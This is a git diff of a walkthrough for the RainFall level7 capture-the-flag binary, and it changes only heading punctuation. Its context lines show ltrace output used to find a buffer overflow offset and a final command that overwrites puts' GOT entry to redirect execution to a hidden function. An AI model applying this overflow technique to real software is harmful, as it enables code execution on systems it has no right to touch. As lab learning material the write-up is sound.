@@ -62,7 +62,7 @@ man strcy:
 
 -> We can overflow with strcpy.
 
-- Find the overflow offset:
+- Find the overflow offset :  
 ```
 level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 __libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
@@ -77,7 +77,7 @@ strcpy(0x37614136, NULL <unfinished ...> --> 20 in the Buffer Overflow pattern g
 ```  
 --> offset is at 20  
 
-- Build the command  
+- Build the command :  
 
 ```
 ./level7 arg1 arg2
@@ -86,7 +86,7 @@ arg2 = address of m
 ```
 -> so that we have strcpy(dest: &puts, src: &m), so when we call puts("~~"), we will call m in reality.
 
-- Final Command  
+- Final Command :  
 
 ```
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
